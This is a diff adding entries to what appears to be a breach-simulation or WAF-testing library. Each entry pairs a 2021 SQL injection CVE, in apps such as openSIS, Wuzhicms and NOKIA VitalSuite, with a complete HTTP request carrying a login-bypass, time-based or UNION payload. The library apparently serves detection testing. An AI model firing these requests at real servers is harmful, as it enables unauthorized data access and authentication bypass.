@@ -402733,6 +402733,1364 @@
     "visible": true
   },
   {
+    "name": "CVE-2021-41691 - OS4Ed openSIS Community SQL Injection",
+    "displayName": "CVE-2021-41691 - OS4Ed openSIS Community SQL Injection",
+    "description": "OS4Ed openSIS Community 8.0 is vulnerable to SQL injection via the student_id parameter in a POST request to /TransferredOutModal.php. The request sends a boolean OR 1=1 payload in student_id. No vendor WAF rule found; built from the CVE/advisory description (method POST stated in the description).\n\nReferences used to recreate this request:\n- https://github.com/OS4ED/openSIS-Classic/ (vendor repo / PoC) [poc]\n- https://resources.s4e.io/blog/opensis-student-information-system-0-day-vulnerability-cve-2021-41691/ [advisory]\n- https://www.cve.org/CVERecord?id=CVE-2021-41691 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /TransferredOutModal.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nstudent_id=1%27%20OR%201%3D1--%20-&TRANSFER%5BSCHOOL%5D=1\n"
+    },
+    "cves": [
+      "CVE-2021-41691"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41691",
+        "link": "https://github.com/OS4ED/openSIS-Classic/"
+      },
+      {
+        "title": "advisory for CVE-2021-41691",
+        "link": "https://resources.s4e.io/blog/opensis-student-information-system-0-day-vulnerability-cve-2021-41691/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41679 - OS4Ed openSIS Community SQL Injection",
+    "displayName": "CVE-2021-41679 - OS4Ed openSIS Community SQL Injection",
+    "description": "OS4Ed openSIS Community 8.0 is vulnerable to SQL injection via the period parameter of modules/grades/InputFinalGrades.php, reached through /Modules.php. The request appends a time-based AND SLEEP(5) payload to period, matching the published PoC request exactly. No vendor WAF rule found; built from the GitHub issue PoC.\n\nReferences used to recreate this request:\n- https://github.com/OS4ED/openSIS-Classic/issues/204 (PoC request) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41679 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Modules.php?modname=users/TeacherPrograms.php?include=grades/InputFinalGrades.php&include_inactive=&modfunc=gradebook&mp=21&use_percents=true&period=2%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-41679"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41679",
+        "link": "https://github.com/OS4ED/openSIS-Classic/issues/204"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41678 - OS4Ed openSIS Community SQL Injection",
+    "displayName": "CVE-2021-41678 - OS4Ed openSIS Community SQL Injection",
+    "description": "OS4Ed openSIS Community 8.0 is vulnerable to SQL injection via the staff[TITLE] field of modules/users/Staff.php (modfunc=update), reached through /Modules.php as a multipart POST. The request injects an OR 1=1 payload in staff[TITLE], matching the published PoC. No vendor WAF rule found; built from the GitHub issue PoC.\n\nReferences used to recreate this request:\n- https://github.com/OS4ED/openSIS-Classic/issues/203 (PoC request) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41678 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /Modules.php?modname=users/Staff.php&include=DemographicInfoInc&category_id=1&modfunc=update HTTP/1.1\nHost: {{target_host}}\nContent-Type: multipart/form-data; boundary=----cym\nCookie: PHPSESSID=dummy\n\n------cym\nContent-Disposition: form-data; name=\"staff[TITLE]\"\n\n' OR 1=1-- -\n------cym--\n"
+    },
+    "cves": [
+      "CVE-2021-41678"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41678",
+        "link": "https://github.com/OS4ED/openSIS-Classic/issues/203"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41677 - OS4Ed openSIS Community SQL Injection",
+    "displayName": "CVE-2021-41677 - OS4Ed openSIS Community SQL Injection",
+    "description": "OS4Ed openSIS Community 8.0 is vulnerable to SQL injection via the Grade argument processed by functions/GetStuListFnc.php (student-list query assembly). The request injects an OR 1=1 payload in the Grade parameter. GetStuListFnc.php is an included helper reached through the student module, so the /Modules.php?modname=students/Student.php entry path and GET method are INFERRED; the injected argument Grade is taken from the CVE description. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/OS4ED/openSIS-Classic/issues/202 (PoC) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41677 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Modules.php?modname=students/Student.php&Grade=1%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-41677"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41677",
+        "link": "https://github.com/OS4ED/openSIS-Classic/issues/202"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41674 - SourceCodester E-Negosyo System SQL Injection",
+    "displayName": "CVE-2021-41674 - SourceCodester E-Negosyo System SQL Injection",
+    "description": "SourceCodester E-Negosyo System 1.0 is vulnerable to authentication-bypass SQL injection via the user_email parameter of /admin/login.php. The request posts an OR 1=1 payload in user_email. Method POST is inferred from the login-form action (parameter named in the advisory). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/janikwehrli1/0dayHunt/blob/main/E-Negosyo-System-SQLi.txt (PoC) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41674 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nuser_email=admin%27%20OR%201%3D1--%20-&user_password=x\n"
+    },
+    "cves": [
+      "CVE-2021-41674"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41674",
+        "link": "https://github.com/janikwehrli1/0dayHunt/blob/main/E-Negosyo-System-SQLi.txt"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41660 - SourceCodester Patient Appointment Scheduler System SQL Injection",
+    "displayName": "CVE-2021-41660 - SourceCodester Patient Appointment Scheduler System SQL Injection",
+    "description": "SourceCodester Patient Appointment Scheduler System v1 (oretnom23) is vulnerable to authentication-bypass SQL injection via the username field of login.php. The request posts an OR 1=1 payload in username. The login.php path and username/password fields are from the advisory; method POST is inferred from the login form. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-06-092421 (PoC) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41660 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27%20OR%201%3D1--%20-&password=x\n"
+    },
+    "cves": [
+      "CVE-2021-41660"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41660",
+        "link": "https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-06-092421"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41654 - Wuzhicms SQL Injection",
+    "displayName": "CVE-2021-41654 - Wuzhicms SQL Injection",
+    "description": "Wuzhicms 4.1.0 is vulnerable to SQL injection via the keyValue parameter in /coreframe/app/pay/admin/index.php. The request injects a time-based AND SLEEP(5) payload in keyValue. Path and parameter are from the advisory; GET method is inferred (search/key lookup parameter). No vendor WAF rule found; built from the GitHub issue PoC.\n\nReferences used to recreate this request:\n- https://github.com/wuzhicms/wuzhicms/issues/198 (PoC) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41654 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /coreframe/app/pay/admin/index.php?keyValue=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-41654"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41654",
+        "link": "https://github.com/wuzhicms/wuzhicms/issues/198"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41651 - Hotel Management System Blind SQL Injection",
+    "displayName": "CVE-2021-41651 - Hotel Management System Blind SQL Injection",
+    "description": "The tramyardg/Ahmed-Helal Hotel-mgmt-system is vulnerable to blind SQL injection via the cid parameter in process_update_profile.php. The request posts a time-based AND SLEEP(5) payload in cid. Parameter and file are from the advisory; method POST is inferred (profile-update form handler). No vendor WAF rule found; built from the PoC repo.\n\nReferences used to recreate this request:\n- https://github.com/MobiusBinary/CVE-2021-41651/ (PoC) [poc]\n- https://github.com/tramyardg/hotel-mgmt-system (source) [source]\n- https://www.cve.org/CVERecord?id=CVE-2021-41651 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /process_update_profile.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncid=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2021-41651"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41651",
+        "link": "https://github.com/MobiusBinary/CVE-2021-41651/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41676 - oretnom23 Pharmacy Point of Sale System SQL Injection",
+    "displayName": "CVE-2021-41676 - oretnom23 Pharmacy Point of Sale System SQL Injection",
+    "description": "oretnom23 Pharmacy Point of Sale System 1.0 contains multiple SQL injections. The confirmed Exploit-DB PoC (ID 50357, referenced by the CVE) injects via the id parameter of /pharmacy/view_product.php. The request sends a UNION SELECT payload in id. The CVE headline also cites login/actions.php, but the reproducible PoC endpoint view_product.php?id= is used. No vendor WAF rule found; built from the Exploit-DB PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50357 (PoC, multiple SQLi) [poc]\n- https://github.com/janikwehrli1/0dayHunt/blob/main/pharmacypossqli.txt (PoC) [poc]\n- https://www.cve.org/CVERecord?id=CVE-2021-41676 [CVE record]",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /pharmacy/view_product.php?id=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-41676"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-41676",
+        "link": "https://www.exploit-db.com/exploits/50357"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41649 - PuneethReddyHC online-shopping-system-advanced SQL Injection",
+    "displayName": "CVE-2021-41649 - PuneethReddyHC online-shopping-system-advanced SQL Injection",
+    "description": "PuneethReddyHC online-shopping-system-advanced is vulnerable to unauthenticated SQL injection via the cat_id parameter of /homeaction.php, which is submitted by POST and not sanitized. The request sends a boolean OR 1=1 payload in cat_id. No vendor WAF rule found; built from the CVE description entry point (file /homeaction.php, argument cat_id).\n\nReferences used to recreate this request:\n- https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41649 (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41649 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /homeaction.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\ncat_id=1%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2021-41649"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41649",
+        "link": "https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41649"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41648 - PuneethReddyHC online-shopping-system-advanced SQL Injection",
+    "displayName": "CVE-2021-41648 - PuneethReddyHC online-shopping-system-advanced SQL Injection",
+    "description": "PuneethReddyHC online-shopping-system-advanced is vulnerable to unauthenticated SQL injection via the prId parameter of /action.php, submitted by POST without sanitization. The request sends a UNION SELECT payload in prId. No vendor WAF rule found; built from the CVE description entry point (file /action.php, argument prId) and the PoC.\n\nReferences used to recreate this request:\n- https://github.com/MobiusBinary/CVE-2021-41648 (PoC)\n- http://packetstormsecurity.com/files/165036/PuneethReddyHC-Online-Shopping-System-Advanced-1.0-SQL-Injection.html (advisory)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41648 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /action.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nprId=-1%27+UNION+SELECT+1,2,3,4,5,6,7--+-\n"
+    },
+    "cves": [
+      "CVE-2021-41648"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41648",
+        "link": "https://github.com/MobiusBinary/CVE-2021-41648"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41647 - Kaushik Jadhav Online Food Ordering Web App SQL Injection",
+    "displayName": "CVE-2021-41647 - Kaushik Jadhav Online Food Ordering Web App SQL Injection",
+    "description": "Kaushik Jadhav Online Food Ordering Web App 1.0 has an unauthenticated error-based and time-based blind SQL injection in the username parameter of login.php. The request sends an OR 1=1 authentication-bypass payload in username. No vendor WAF rule found; built from the CVE description entry point (login.php, username parameter).\n\nReferences used to recreate this request:\n- https://github.com/MobiusBinary/CVE-2021-41647 (PoC)\n- http://packetstormsecurity.com/files/164422/Online-Food-Ordering-Web-App-SQL-Injection.html (advisory)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41647 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+OR+1%3D1--+-&password=x\n"
+    },
+    "cves": [
+      "CVE-2021-41647"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41647",
+        "link": "https://github.com/MobiusBinary/CVE-2021-41647"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41609 - ClassApps SelectSurvey.NET SQL Injection",
+    "displayName": "CVE-2021-41609 - ClassApps SelectSurvey.NET SQL Injection",
+    "description": "SelectSurvey.NET before 5.052.000 has an unauthenticated SQL injection in the ID parameter of the UploadedImageDisplay.aspx endpoint, exploitable via boolean-based blind and UNION injection. The request sends a UNION SELECT payload in the ID query parameter. Method inferred GET (image-display endpoint read by ID). No vendor WAF rule found; built from the CVE description entry point.\n\nReferences used to recreate this request:\n- https://www.optiv.com/insights/source-zero/blog/classapps-inc-selectsurveynet-v50-vulnerabilities-disclosure (advisory)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41609 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /UploadedImageDisplay.aspx?ID=1%20UNION%20SELECT%20NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-41609"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "windows",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "waf_rule_advisory for CVE-2021-41609",
+        "link": "https://www.optiv.com/insights/source-zero/blog/classapps-inc-selectsurveynet-v50-vulnerabilities-disclosure"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41492 - SourceCodester Simple Cashiering System SQL Injection",
+    "displayName": "CVE-2021-41492 - SourceCodester Simple Cashiering System SQL Injection",
+    "description": "SourceCodester Simple Cashiering System (POS) 1.0 has multiple SQL injections; this request targets the t parameter of actions.php with a UNION SELECT payload. Method inferred GET (actions.php uses a t selector parameter). No vendor WAF rule found; built from the CVE description plus the Checkmarx advisory entry point (file actions.php, argument t).\n\nReferences used to recreate this request:\n- https://3xpl017.blogspot.com/2021/09/multiple-sql-injections-in.html (advisory/PoC)\n- https://devhub.checkmarx.com/?p=324528 (advisory)\n- https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41492 (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41492 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /actions.php?t=1%27%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-41492"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41492",
+        "link": "https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41492"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41487 - NOKIA VitalSuite SPM SQL Injection",
+    "displayName": "CVE-2021-41487 - NOKIA VitalSuite SPM SQL Injection",
+    "description": "NOKIA VitalSuite SPM 2020 is affected by SQL injection via the UserName field of the /cgi-bin/vsloginadmin.exe login handler. The request POSTs the login form (Password, Submit, UserName, mode) with a time-based WAITFOR DELAY payload in UserName. No vendor WAF rule found; built from the Exploit-DB PoC which gives the exact path and form body.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/48528 (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41487 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /cgi-bin/vsloginadmin.exe HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nPassword=test&Submit=%20Login%20&UserName=test%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--+-&mode=1\n"
+    },
+    "cves": [
+      "CVE-2021-41487"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "windows",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-41487",
+        "link": "https://www.exploit-db.com/exploits/48528"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41433 - EGavilan Media Resumes Management and Job Application Website SQL Injection",
+    "displayName": "CVE-2021-41433 - EGavilan Media Resumes Management and Job Application Website SQL Injection",
+    "description": "EGavilan Media Resumes Management and Job Application Website 1.0 has a SQL injection authentication-bypass in the login form via login.php. The request sends OR 1=1 payloads in the username and password parameters. No vendor WAF rule found; built from the CVE description/PoC entry point (login.php).\n\nReferences used to recreate this request:\n- https://github.com/martinkubecka/CVE-References/blob/main/CVE-2021-41433.md (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41433 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+OR+1%3D1--+-&password=admin%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2021-41433"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-41433",
+        "link": "https://github.com/martinkubecka/CVE-References/blob/main/CVE-2021-41433.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-41408 - VoIPmonitor WEB GUI SQL Injection",
+    "displayName": "CVE-2021-41408 - VoIPmonitor WEB GUI SQL Injection",
+    "description": "VoIPmonitor WEB GUI up to version 24.61 is affected by SQL injection through the api.php file and the user parameter. The request sends an OR 1=1 payload in the user parameter. Method inferred GET (api.php query parameter). No vendor WAF rule found; built from the CVE description entry point (file api.php, argument user).\n\nReferences used to recreate this request:\n- https://gist.github.com/divinepwner/e51050e0d7df77ff1f1379583e8cf7db (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-41408 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /api.php?user=admin%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-41408"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_gist for CVE-2021-41408",
+        "link": "https://gist.github.com/divinepwner/e51050e0d7df77ff1f1379583e8cf7db"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40955 - LaiKetui SQL Injection",
+    "displayName": "CVE-2021-40955 - LaiKetui SQL Injection",
+    "description": "LaiKetui v3.5.0 is vulnerable to SQL injection in the administrator background. The 'id' parameter of the member modify action (index.php?module=member&action=modify&id=) is concatenated unsanitized into \"select * from ... where id = '$id'\", allowing a time-based injection. The request sends an AND SLEEP(5) payload in id. Method GET taken from the PoC. No vendor WAF rule found; built from the PoC issue.\n\nReferences used to recreate this request:\n- https://github.com/bettershop/LaikeTui/issues/12 (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-40955 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /app/LKT/index.php?module=member&action=modify&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40955"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40955",
+        "link": "https://github.com/bettershop/LaikeTui/issues/12"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40956 - LaiKetui SQL Injection",
+    "displayName": "CVE-2021-40956 - LaiKetui SQL Injection",
+    "description": "LaiKetui v3.5.0 is vulnerable to SQL injection in the administrator background menu management function. The 'id' parameter of the menu modify action (index.php?module=menu&action=modify&id=), handled by modifyAction.class.php, is concatenated unsanitized into \"select * from lkt_core_menu where id = '$id'\". The request sends an AND SLEEP(5) payload in id. Method GET taken from the PoC. No vendor WAF rule found; built from the PoC issue.\n\nReferences used to recreate this request:\n- https://github.com/bettershop/LaikeTui/issues/13 (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-40956 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /app/LKT/index.php?module=menu&action=modify&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40956"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
